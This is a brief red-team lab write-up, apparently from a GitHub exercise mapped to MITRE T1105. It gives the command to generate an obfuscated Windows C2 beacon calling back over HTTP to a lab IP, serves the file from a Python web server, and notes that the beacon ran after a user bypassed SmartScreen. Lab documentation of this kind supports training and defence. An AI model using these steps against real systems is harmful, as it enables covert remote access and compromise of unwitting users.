# Beacon Generation & Delivery

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

## Generating the Beacon
generate beacon --http 192.168.30.138:6789
--os windows --arch amd64 --save /tmp/beacon.exe

<img width="1800" height="204" alt="image" src="https://github.com/user-attachments/assets/c865736e-aa16-4862-9456-6d706084202b" />


## Key Generation Details
- **Symbol obfuscation enabled** — makes reverse 
  engineering harder
- **Target:** windows/amd64
- **C2 channel:** HTTP to 192.168.30.138:6789

## Delivery via Python HTTP Server
cd /tmp
python3 -m http.server 8080
<img width="1649" height="350" alt="image" src="https://github.com/user-attachments/assets/c93dba57-2c2c-4eac-b9c5-0905c5dd63a2" />


## AV Evasion — SmartScreen Bypass
<img width="1891" height="820" alt="image" src="https://github.com/user-attachments/assets/58b2b23f-fd13-4481-99a6-de5431a673d2" />

Despite SmartScreen warning, beacon executed 
successfully when user clicked "Run anyway" — 
simulating a social engineering scenario where 
a user is tricked into running a malicious file.
